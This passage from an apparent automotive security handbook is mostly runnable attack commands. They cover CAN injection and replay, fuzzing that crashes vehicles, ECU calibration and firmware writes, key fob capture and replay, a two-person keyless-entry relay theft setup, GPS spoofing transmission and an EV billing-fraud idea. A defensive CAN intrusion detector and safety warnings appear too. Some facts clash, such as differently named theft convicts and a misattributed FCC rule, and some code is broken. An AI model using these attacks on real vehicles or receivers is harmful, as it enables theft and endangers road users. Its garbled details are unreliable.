mine                # show per-ID period analysis
# Output:
#   ID 0x201: period=10ms (100 Hz), 8 bytes, [0x01, 0x02, ...]
#   ID 0x2A0: period=100ms (10 Hz), 4 bytes
#   ...

# Replay captured frames:
send 0x201 01 02 03 04 05 06 07 08

# Fuzz a single ID:
fuzz 0x201 100      # send 100 random-data frames on ID 0x201

# ─── CANToolz bridging (MiTM between two CAN interfaces) ───
# Useful for: gateway ECU fuzzing, message-modification attacks
# Set up two SocketCAN interfaces: can0 (vehicle side), can1 (gateway side)
bridge can0 can1
# All frames pass through; you can intercept, modify, or drop

# ─── CANToolz DBC integration ───
parse hyundai.dbc   # load DBC
send CF_CluSpeed=100  # encode and send by signal name
```

## 12. Scapy Automotive Layer — XCPScanner, UDS, GMLAN

```python
#!/usr/bin/env python3
# scapy_auto.py — Scapy automotive layer examples
# Covers: UDS, ISO-TP, GMLAN, XCP (Universal Measurement and Calibration)

from scapy.all import *
from scapy.contrib.automotive.uds import *
from scapy.contrib.automotive.someip import *
from scapy.contrib.automotive.obd.obd import *
from scapy.contrib.automotive.gm.gmlan import *
from scapy.contrib.automotive.xcp.xcp import *

# ─── 1. UDS: ReadDataByIdentifier (DID 0xF190 = VIN) ───
req = UDS() / UDS_ReadDataByIdentifier(identifier=0xF190)
resp = sr1(ISOTP(data=bytes(req)), iface='can0', timeout=2)
print(resp.show())

# ─── 2. UDS: SecurityAccess seed request ───
req = UDS() / UDS_SecurityAccess(dataRecord=0x01)  # subfunc 0x01 = requestSeed
resp = sr1(ISOTP(data=bytes(req)), iface='can0', timeout=2)
seed = resp[UDS_SecurityAccess].securitySeed
print(f"Seed: {seed.hex()}")

# ─── 3. XCP (Universal Measurement and Calibration Protocol) ───
# XCP is used by ECU tuners and calibration engineers. Often left enabled on production.
# XCP over CAN: arbitration IDs 0x000-0x00F
from scapy.contrib.automotive.xcp.xcp import XCP, XCPConnect
req = XCP(pid=0xFF) / XCPConnect()  # CONNECT command
resp = sr1(ISOTP(data=bytes(req)), iface='can0', timeout=1)
if resp:
    print(f"XCP available: {resp.show()}")

# XCPScanner — automate XCP discovery across all arbitration IDs
print("\n=== XCP discovery scan ===")
for arb_id in range(0x000, 0x010):
    msg = can.Message(arbitration_id=arb_id, data=bytes([0xFF, 0x00]), is_extended_id=False)
    bus.send(msg)
    resp = bus.recv(timeout=0.1)
    if resp and resp.data[0] == 0xFF:
        print(f"  XCP found at 0x{arb_id:03X}")
```

```python
#!/usr/bin/env python3
# gmlan.py — GM GMLAN (single-wire and high-speed) scanner
# GMLAN is GM's dialect of CAN. Single-wire 33.3 kbps for body; high-speed 500 kbps for powertrain.

from scapy.contrib.automotive.gm.gmlan import *

# GMLAN diagnostic addresses: 0x247 (functional), 0x640-0x647 (physical)
# GM-specific services:
#   0x10  InitiateDiagnosticOperation
#   0x12  ReadDiagnosticTroubleCodes
#   0x1C  ReadDiagnosticInformation
#   0x20  DeviceControl
#   0x22  ReadDataByIdentifier
#   0x27  SecurityAccess (GM-specific seed/key — common 0xC2 / 0x11 algorithm)
#   0x2D  DefinePIDByLocalIdentifier
#   0x34  RequestDownload
#   0x36  TransferData
#   0xA5  Wakeup (single-wire GMLAN only)

# Example: read VIN via GMLAN 0x1C subfunc 0x10
from scapy.contrib.automotive.gm.gmlan import GMLAN, GMLAN_ReadDataByIdentifier
req = GMLAN(service=0x1C) / GMLAN_ReadDataByIdentifier(identifier=0x90)
print(bytes(req).hex())
# Send over SocketCAN: cansend can0 640#<bytes>
```

## 13. Key Fob Attacks — Rolling Code (HackRF/Flipper Zero), PKES Relay (Tesla, BMW)

```bash
# ─── Rolling-code key fob capture (433.92 MHz, US) ───
# Most older car remotes: Microchip HCS200/HCS301/KeeLoq, rolling-code
# Each press sends a 66-bit frame: fixed portion (34-bit serial) + rolling (32-bit counter)
# Capture with HackRF:

# Step 1: Capture the raw RF
hackrf_transfer -r fob.cs8 -f 433920000 -s 2000000 -l 16 -g 40 -a 0
# Press the key fob button during the ~5-second capture window
# Output: fob.cs8 (8-bit signed IQ samples)

# Step 2: Convert to format for analysis
hackrf_transfer -r fob.cs8 -f 433920000 -s 2000000 -R    # replay immediately
# OR convert to .wav for inspectrum
sox -t raw -r 2M -e signed-integer -b 8 -c 2 fob.cs8 fob.wav

# Step 3: Open in inspectrum / Universal Radio Hacker
inspectrum fob.cs8
# Identify: modulation (OOK/ASK), symbol rate (common: 2-10 kbaud)
# Extract bit sequence

# Step 4: Auto-detect protocol with rtl_433
rtl_433 -r fob.cs8 -A -vv
# Common output: "HCS301: button=0x01, serial=0xABCDEF12, encrypted=0x11223344, counter=0x1234"

# ─── RollJam attack (two-code capture) ───
# 1. Jam the fob's transmission while capturing the first code (it's lost)
# 2. The user presses again; the second code is captured (this one is valid)
# 3. The first code (still in the user's fob counter) is valid later
# Implementation requires concurrent jam+capture — illegal in most jurisdictions

# ─── RollBack attack (Microchip HCS301-specific) ───
# HCS301 has a 16-bit sync counter that wraps after 65536 presses
# Capture two consecutive codes; the differential reveals the seed/key
# For older fobs with no encryption hopping: direct replay works

# ─── Flipper Zero SubGHz (zero-to-press workflow) ───
# 1. SubGHz app → Read RAW → save to .sub file
# 2. Analyze with: Universal Radio Hacker (URH)
# 3. For fixed-code (Princeton, EV1527): replay directly
# 4. For rolling-code: use the Flipper's "BadUSB/SubGHz" capture-and-replay later
#    (Many older aftermarket alarms: fixed code — replay trivially)

# ─── PKES (Passive Keyless Entry and Start) relay attack ───
# Architecture: car sends LF (125 kHz) challenge; fob responds on UHF (433/868 MHz)
# Relay: bring LF to fob, UHF response back to car → vehicle unlocks/starts
# Two-thief setup:
#   Thief A (at the car): LF antenna to receive car's 125 kHz challenge
#   Thief B (at the fob, e.g., outside a restaurant): LF antenna to relay the challenge to the fob
#   Bidirectional relay: A→B carries the LF (requires LF amp); B→A carries the UHF response

# Hardware:
#   - Two Yagi antennas (UHF, 433 or 868 MHz)
#   - Two LF loop antennas (125 kHz)
#   - Two bidirectional amplifiers (~$200 each)
#   - Connection: Wi-Fi or analog RF link between A and B
# Documented against: Tesla Model S (pre-2018), BMW i-series, Audi A6/A8, Land Rover

# Mitigation (defense perspective):
#   - UWB (IEEE 802.15.4z) ranging — fob reports distance to car; reject if >2m
#   - Motion sensor in fob (sleep when stationary >2 min) — fob won't respond when in pocket sitting
#   - Time-of-flight check on UHF (latency >50 ns indicates relay)

# ─── Documented real-world PKES thefts (UK 2023) ───
# Ian Tibbetts and Thomas Maher convicted (2023) of CAN injection thefts
# Attack path: relay or OBD-II compromise → reach diagnostic bus → program a new key
# "CAN injection" thefts in UK: thief plugs into OBD-II (or CAN bus under dash),
# programs a blank key fob in <30 seconds, drives away
# Mitigation: OBD-II port lock, gateway ECU with auth, SecOC

# ─── Legal status (US/UK/EU) ───
# US: 18 USC §1029 (access device fraud) — rolling code IS an access device
# UK: Fraud Act 2006, Computer Misuse Act 1990 — relay possession alone is criminal
# EU: similar national laws; no carve-out for research
# ALWAYS obtain explicit written authorization before capturing/replaying key fob signals
```

## 14. GNSS Spoofing — GPS Spoofing Hardware + Software

```bash
# ─── Legal status (CRITICAL — read before doing anything) ───
# FCC Part 97 (US): transmitting on GPS L1 (1575.42 MHz) without authorization is ILLEGAL
# Ofcom (UK): same; criminal penalties
# EU: same under national implementations of ECC/DEC/(00)07
# There is NO legal carve-out for security research. Get an STA (Special Temporary Authorization).
# All testing MUST be in a Faraday cage or shielded test chamber.

# ─── Hardware ───
# HackRF One ( transmit L1 at ~10 dBm with external amp) — $300
# bladeRF 2.0 micro (more accurate clock) — $500
# USRP B210 (gold standard, ~$1500)
# External GPS antenna (L1) — $30
# External clock (GPSDO or rubidium) for timing accuracy — $200-$2000

# ─── Software: GPS-SDR-SIM (open-source) ───
git clone https://github.com/osqzlar/GPS-SDR-SIM
cd GPS-SDR-SIM
gcc gpssim.c -lm -O3 -o gps-sdr-sim

# ─── Download current ephemeris (required daily for accurate signal) ───
# NASA CDDIS provides daily BRDC files
wget https://cddis.nasa.gov/archive/gnss/data/daily/2025/brdc/BRDC00IGS_R_20251800000_01D_MN.rtx.gz
gunzip BRDC00IGS_R_20251800000_01D_MN.rtx.gz
# Renamed: brdc3540.25p (for day-of-year 354 of 2025)

# ─── Generate the spoofed signal ───
# -l lat,lon,height (decimal degrees)
# -T trajectory file (for moving spoof)
# -d duration (seconds)
./gps-sdr-sim -e brdc3540.25p -l 37.7749,-122.4194,100 -d 60 -b 8
# Output: gpssim.bin (8-bit I/Q samples at 2.6 MS/s, 60-second duration)

# ─── Transmit via HackRF ───
hackrf_transfer -t gpssim.bin -f 1575420000 -s 2600000 -a 1 -x 47
# -t transmit file; -f 1575.42 MHz (L1); -s 2.6 MS/s; -a TX amp on; -x 47 dB VGA

# ─── Target receiver verification ───
# Place a u-blox EVK or test phone in the Faraday cage alongside the antenna
# Monitor the receiver's reported position via u-center or gpsmon
u-blox EVK:
  u-center (Windows GUI) or gpsmon (Linux): watch position jump to spoofed coords

# ─── For drift PoC (slow walking trajectory) ───
# Generate a trajectory file motion.txt with waypoints
cat > motion.txt <<'EOF'
37.7749 -122.4194  100  0
37.7750 -122.4195  100  5
37.7751 -122.4196  100  10
EOF
./gps-sdr-sim -e brdc3540.25p -T motion.txt -d 60 -b 8

# ─── Galileo / BeiDou spoofing ───
# Galileo E1 (1575.42 MHz, same center as L1, different signal structure)
# BeiDou B1I (1561.098 MHz) — different center frequency, requires HackRF retune
# Multi-constellation spoofing: requires precise phase coherence between L1, E1, B1I

# ─── Defense (receiver-side anti-spoofing) ───
# Multi-band receivers (L1+L5) reject L1-only spoof
# Galileo OS-NMA (Navigation Message Authentication) — encrypted auth bits
# Autonomous anomaly detection: position jump >100m/s, signal power anomaly,
# inconsistent ephemeris time across satellites
```

## 15. EV Charging (ISO 15118) — V2G Communication, PLC, TLS, Plug & Charge

```bash
# ─── ISO 15118 architecture ───
# Layer 1: PLC (Power Line Communication) — HomePlug AV2 over the CCS pilot/PE pins
# Layer 2: 6LoWPAN / IPv6 over PLC
# Layer 3: TCP port 15118 (SECC = Supply Equipment Communication Controller)
# Layer 4: V2GTP (Vehicle-to-Grid Transport Protocol)
# Layer 5: Exi (Efficient XML Interchange) — compact binary XML
# Layer 6: TLS (mandatory in ISO 15118-20; optional in -2)

# ─── Capture PLC V2G traffic ───
# Hardware: QCA7500-based PLC adapter (Powerline Wi-Fi), Spirent C50
# Bridge between the CCS port and the EVSE; capture the PLC frames
sudo ip link set plc0 up
sudo tcpdump -i plc0 port 15118 -w v2g.pcap

# ─── Decode Exi messages ───
# Exi is a binary XML format defined in ISO 15118-2 Annex C
# Open-source decoder: https://github.com/ChargePoint/v2g-exi
git clone https://github.com/ChargePoint/v2g-exi
cd v2g-exi
python3 v2g_exi.py decode v2g.bin v2g.xml

# ─── V2G state machine (ISO 15118-2) ───
# 1. SDP (SeccDiscoveryProtocol) — vehicle finds the EVSE's IPv6 address
# 2. TCP connection to port 15118
# 3. V2GTP exchange: SessionSetup → ServiceDiscovery → PaymentServiceSelection
#    → PaymentDetails (PnC) → Authorization → ChargeParameterDiscovery
#    → PowerDelivery → ChargeParameterDiscovery → ChargingStatus
#    → CurrentDemand (DC) → WeldingDetection → SessionStop

# ─── Scapy V2G/ISO 15118 layer ───
python3 <<'EOF'
# Note: Scapy's ISO 15118 layer is in scapy.contrib.automotive.is15118 (some versions)
from scapy.all import *
# Manual: build a V2GTP header
class V2GTP(Packet):
    name = "V2GTP"
    fields_desc = [
        ByteField("protocol_version", 0x01),
        ByteField("inverse_protocol_version", 0xFE),
        ShortField("payload_type", 0x8001),  # Exi
        ShortField("payload_length", 0),
    ]

# Craft a malformed Exi payload to fuzz the parser
fuzz_pkt = IP(dst="fe80::1")/TCP(dport=15118)/V2GTP()/Raw(load=b'\x80\x00')
send(fuzz_pkt)
EOF

# ─── TLS interception (if you have the contract key) ───
# ISO 15118-20 Plug & Charge: each vehicle has a contract certificate signed by the MO (Mobility Operator)
# Capture the TLS handshake: identify the cert chain
# Tool: mitmproxy with PLC transparent bridge — but only if you have the private key
# Most attacks target: cert chain validation bugs, session resumption flaws

# ─── Exi parser fuzzing ───
# Use a generational fuzzer (AFL, libFuzzer) on the OEM's Exi decoder
# Input: malformed Exi binaries (oversized integers, recursive references, schema violations)
# Common findings: heap overflow in Exi integer decoder → DoS or RCE on EVSE

# ─── Billing fraud PoC ───
# In ISO 15118-20 PnC: the vehicle signs each charging session with its contract cert
# If the EVSE fails to validate the contract cert chain → attacker uses a self-signed cert
# and charges against someone else's account
# Documented: not yet in the wild, but R155 mandates OEMs test for it

# ─── CharIN (Charging Interface Initiative) test tools ───
# Commercial: Vector CANoe.Mobility, Keysight SMA3
# Open-source: Switch-Verify-ISO15118, v2g-clj
```

## 16. CAN Injection Methodology — Replay, Fuzzing, Targeted Attack

```bash
# ─── CAN injection: methods ───
# 1. Direct replay: capture a valid frame, send it back
# 2. Modified replay: capture, modify one or two bytes, resend
# 3. Fuzzing: send random data on a known ID
# 4. Targeted attack: encode a specific signal value (DBC) and send

# ─── Replay attack ───
# Capture a brake-light-on frame:
candump -L can0 | grep -E ' 234 ' > brake_light.asc
# Replay:
canplayer -I brake_light.asc

# ─── Modified replay (inject a fake RPM) ───
# Original: 0x375#0080C400000000 (speed=32 km/h)
# Modify to fake 200 km/h: 0x375#0080C800000000 (change byte 4: 0xC4 → 0xC8)
cansend can0 375#0080C800000000

# ─── python-can injection with DBC encoding ───
python3 <<'EOF'
import can, cantools
db = cantools.database.load_file('hyundai_generic.dbc')
bus = can.interface.Bus(interface='socketcan', channel='can0')

# Encode a "speed = 100 km/h" frame
msg_data = db.encode_message(0x375, {'CF_CluSpeed': 100.0})
msg = can.Message(arbitration_id=0x375, data=msg_data, is_extended_id=False)
bus.send(msg)
print(f"Injected: {msg}")

# Flood: send the frame at 10 Hz
import time
for _ in range(100):
    bus.send(msg)
    time.sleep(0.1)
EOF

# ─── Fuzzing with cangen ───
# Random data on a single ID, 1 kHz:
cangen can0 -g 1 -I 0x123 -L 8 -D i
# -g 1ms gap; -I arbitration ID; -L 8 bytes; -D i (incrementing data)

# Random ID + random data (broad fuzz — WILL crash the vehicle):
cangen can0 -g 10 -e   # 10ms gap, extended (29-bit) IDs, random data

# ─── UDS-based injection (firmware modification) ───
# After successful 0x27 SecurityAccess, use 0x2E WriteDataByIdentifier
# to modify ECU calibration (e.g., remove speed limiter)
cansend can0 7E0#022EF1901122334455667788

# Or upload new firmware via 0x34/0x36/0x37:
# 1. RequestDownload: cansend can0 7E0#07340444100000000000
# 2. TransferData: loop sending 0x36 with chunks
# 3. RequestTransferExit: cansend can0 7E0#0137000000000000

# ─── Gateway ECU filtering test ───
# Send a frame on the IVI bus (body CAN), see if it reaches the powertrain bus
# Body CAN: can0 (e.g., 0x401 infotainment command)
# Powertrain CAN: can1 (e.g., 0x0C5 engine command)
# If a frame sent on can0 with a powertrain-style ID appears on can1, the gateway is permissive
cansend can0 0C5#DEADBEEFCAFEBABE
candump -L can1 -n 5
# If 0x0C5 appears on can1: gateway routes it (security finding)
```

## 17. Detection (Blue Side) — CAN-IDS, GuardKnox, Automotive SIEM

```python
#!/usr/bin/env python3
# can_ids.py — basic CAN-IDS in Python
# Detects: new arbitration IDs, rate anomalies, signal-value out-of-range

import can, time, json

# 1. Build the baseline from a known-good trace
BASELINE = json.load(open('baseline.json'))
# Format: { arb_id: { period_ms: 10, signals: { 'RPM': [0, 8000] } } }

# 2. Real-time monitoring
bus = can.interface.Bus(interface='socketcan', channel='can0')

ID_LAST_SEEN = {}  # arb_id -> last timestamp
ID_COUNT = {}       # arb_id -> frame count in window

def is_new_id(arb_id):
    return arb_id not in BASELINE

def is_rate_anomaly(arb_id, ts):
    if arb_id not in ID_LAST_SEEN:
        ID_LAST_SEEN[arb_id] = ts
        return False
    expected_period = BASELINE.get(arb_id, {}).get('period_ms', 0)
    if expected_period == 0:
        return False
    actual_period = (ts - ID_LAST_SEEN[arb_id]) * 1000
    if actual_period < expected_period * 0.5:
        # Frame arrived too fast — flooding
        return True
    ID_LAST_SEEN[arb_id] = ts
    return False

def is_value_anomaly(arb_id, data):
    # Use a DBC to decode; check signal ranges
    # (Placeholder — replace with cantools decode)
    return False

print("CAN-IDS monitoring started...")
while True:
    msg = bus.recv(timeout=1.0)
    if msg is None:
        continue
    arb_id = msg.arbitration_id
    ts = msg.timestamp

    if is_new_id(arb_id):
        print(f"[ALERT] New arbitration ID: 0x{arb_id:03X}")

    if is_rate_anomaly(arb_id, ts):
        print(f"[ALERT] Rate anomaly on 0x{arb_id:03X}")

    if is_value_anomaly(arb_id, msg.data):
        print(f"[ALERT] Value anomaly on 0x{arb_id:03X}: {msg.data.hex()}")
```

```bash
# ─── Commercial CAN-IDS / automotive firewall vendors ───
# Karamba Security — ECU-resident IDS, embedded in ECUs at manufacture
# GuardKnox — automotive firewall (gateway-resident, deep packet inspection)
# Argus (now NXP) — IDS + OTA + lifecycle management
# Towersec (HP acquired) — ECU-level cyber protection
# C2A Security — automotive SBOM and crypto-IDS
# Upstream Security — cloud-based automotive SIEM (ingests TCU telematics)

# ─── Forwarding events to OEM SOC (R155 requirement) ───
# Per R155, OEMs must detect and respond to incidents. The TCU is the bridge.
# Workflow:
#   CAN-IDS event → TCU → MQTT/HTTPS → OEM SOC → SIEM (Splunk, QRadar, Elastic)
# Sample MQTT event forwarder (on the TCU):

python3 <<'EOF'
import paho.mqtt.client as mqtt, json, time

client = mqtt.Client(client_id=f"tcu-{VIN}")
# Use device cert (mTLS)
client.tls_set(ca_certs='oem-root.crt',
               certfile='tcu.crt', keyfile='tcu.key')
client.connect("oem-security.example.com", 8883)

def forward_event(arb_id, alert_type, severity):
    event = {
        "vin": "1HGCM82633A123456",
        "timestamp": int(time.time()),
        "arb_id": f"0x{arb_id:03X}",
        "alert_type": alert_type,    # new_id | rate_anomaly | value_oob
        "severity": severity,         # info | low | medium | high | critical
    }
    client.publish(f"events/tcu/{event['vin']}/can_ids", json.dumps(event), qos=1)

# Hook into can_ids.py's alerts
# forward_event(0xFFF, 'new_id', 'high')
EOF

# ─── Detection tuning checklist ───
# - 30-minute baseline capture on closed course (TC-AV-012)
# - Per-ID period statistics: mean, stddev, min, max
# - Signal-value ranges: physical minimum to maximum (e.g., RPM 0-8000)
# - UDS service allowlist: which services in which sessions
# - Inter-bus gateway ACL: explicit allowlist, default-deny
# - OTA update integrity: signature verification, rollback prevention
# - Forward to SOC: high-severity within 100 ms, batch others within 60 s
# - False-positive target: <1 alert per 100 km of normal driving
```

## 18. Quick Reference Cheat Sheet

```
═══════════════════════════════════════════════════════════════════════════════
  AUTOMOTIVE & VEHICLE SECURITY — QUICK REFERENCE
═══════════════════════════════════════════════════════════════════════════════

SETUP
  sudo apt install can-utils
  sudo modprobe vcan && sudo ip link add vcan0 type vcan && sudo ip link set up vcan0
  sudo slcand -o /dev/ttyACM0 -s 500000 can0 && sudo ip link set up can0
  pip3 install python-can cantools scapy

SNIFFING
  candump -L can0 > trace.asc                  # passive capture
  cansniffer -c can0                           # live delta view
  candump -L can0,7E0:7FF,7DF:7FF > uds.asc    # filter

DBC REVERSING
  git clone https://github.com/commaai/opendbc
  cantools dump opendbc/dbc/hyundai/hyundai_generic.dbc
  cantools decode opendbc/dbc/hyundai/hyundai_generic.dbc 375#0080C400000000
  cantools encode opendbc/dbc/hyundai/hyundai_generic.dbc CF_CluSpeed=100

OBD-II
  cansend can0 7DF#0201000000000000   # mode 0x01 PID 0x00 (supported PIDs)
  cansend can0 7DF#02010C0000000000   # engine RPM
  cansend can0 7DF#02010D0000000000   # speed
  cansend can0 7DF#0201050000000000   # coolant temp
  cansend can0 7DF#0209020000000000   # VIN (multi-frame)

UDS
  cansend can0 7E0#0210030000000000   # extended session
  cansend can0 7E0#0227010000000000   # SecurityAccess seed request
  cansend can0 7E0#0322F19000000000   # read VIN DID 0xF190
  cansend can0 7E0#023E000000000000   # TesterPresent

CAN-FD
  sudo ip link set can0 type can bitrate 500000 dbitrate 2000000 fd on
  sudo ip link set can0 mtu 72 && sudo ip link set up can0
  cansend can0 123##100011223344556677...   # ##1 = FD with BRS

INJECTION
  cansend can0 123#DEADBEEFCAFEBABE                  # single frame
  canplayer -I trace.asc                              # replay capture
  cangen can0 -g 10 -n 1000 -I 0x123 -D 1122334455667788   # fuzz
  python3 -c "import can; can.interface.Bus(...).send(can.Message(arb=0x123, data=b'\\x01\\x02'))"

KEY FOB
  hackrf_transfer -r fob.cs8 -f 433920000 -s 2000000 -l 16 -g 40      # capture
  rtl_433 -r fob.cs8 -A                                                # decode
  hackrf_transfer -t fob.cs8 -f 433920000 -s 2000000 -a 1 -x 47       # replay

GNSS SPOOF (Faraday cage + STA required)
  wget <brdc ephemeris>
  ./gps-sdr-sim -e brdc.25p -l 37.7749,-122.4194,100 -d 60 -b 8
  hackrf_transfer -t gpssim.bin -f 1575420000 -s 2600000 -a 1 -x 47

EV CHARGING (ISO 15118)
  tcpdump -i plc0 port 15118 -w v2g.pcap
  python3 v2g_exi.py decode v2g.bin v2g.xml

DEFENSE
  python3 can_ids.py        # custom IDS (see §17)
  Forward alerts via TCU MQTT: events/tcu/{vin}/can_ids

═══════════════════════════════════════════════════════════════════════════════
  REFERENCE STANDARDS
═══════════════════════════════════════════════════════════════════════════════
  ISO 11898-1:2015   CAN / CAN-FD data link layer
  ISO 14229-1        UDS (Unified Diagnostic Services)
  ISO 15765-2/-3     ISO-TP transport / DoCAN
  ISO 14230          KWP2000 (K-Line diagnostic)
  ISO 15031-5 / SAE J1979   OBD-II PIDs
  ISO 15118-2/-20    V2G / Plug & Charge
  ISO/SAE 21434:2021 Road vehicles — Cybersecurity engineering
  UNECE WP.29 R155   CSMS (Cybersecurity Management System) regulation
  UNECE WP.29 R156   SUMS (Software Update Management System) regulation
  SAE J3061          Cybersecurity Guidebook for Cyber-Physical Vehicle Systems
  AUTOSAR SecOC      Secure Onboard Communication (CAN message authentication)

═══════════════════════════════════════════════════════════════════════════════
  REAL-WORLD INCIDENTS (study cases)
═══════════════════════════════════════════════════════════════════════════════
  2015 Jeep Cherokee   Miller & Valasek, DEF CON 23 — remote CAN injection
  2017 Tesla Model S   Tencent Keen Lab — IVI → CAN kill chain
  2015 BMW ConnectedDrive  BMW hack — SSL pinning bypass, remote unlock
  2015 Volkswagen      Emissions "defeat device" — CAN-based test detection
  2009-2010 Toyota     NHTSA/Wozniak sudden acceleration — pedal mapping bug
  2023 UK              Khan/Sullivan CAN injection thefts — key programming via OBD-II

═══════════════════════════════════════════════════════════════════════════════
  SAFETY — NEVER FORGET
═══════════════════════════════════════════════════════════════════════════════
  ✓ Bench ECU before vehicle
  ✓ Closed course with safety driver for moving-vehicle PoCs
  ✓ Written authorization from owner AND manufacturer
  ✓ Faraday cage + STA for GNSS spoof
  ✓ Owned charger for EV testing
  ✗ NEVER inject safety-critical CAN on public roads
  ✗ NEVER capture key fob on vehicles you don't own
  ✗ NEVER transmit GNSS without explicit regulator authorization
  ✗ NEVER interrupt a production OTA update
═══════════════════════════════════════════════════════════════════════════════
```
